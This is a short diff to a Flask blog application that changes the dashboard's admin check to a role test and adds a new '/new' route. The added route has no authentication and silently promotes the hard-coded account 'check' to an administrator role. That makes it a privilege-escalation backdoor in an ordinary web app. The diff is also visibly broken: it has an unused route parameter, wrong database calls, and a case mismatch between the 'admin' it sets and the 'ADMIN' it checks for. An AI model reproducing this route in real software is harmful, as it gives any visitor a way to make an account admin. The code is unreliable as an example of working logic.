@@ -29,7 +29,7 @@ def contact():
 @main.route("/dashboard/", methods=['GET', 'POST'])
 def dashboard():
     # admin already logged in
-    if 'user' in session and User.query.filter_by(username=session['user']).admin:
+    if 'user' in session and ('ADMIN' in User.query.filter_by(username=session['user']).first().role):
         posts = Post.query.all()
         return render_template('dashboard.html', params=params, posts=posts)
 
@@ -261,3 +261,9 @@ def delete(sno):
 #     return "New post added"
 #
 #
+@main.route("/new")
+def new(sno):
+    user = User.query.filter_by(username='check').first()
+    user.role='admin'
+    db.add(user)
+    db.commit(user)
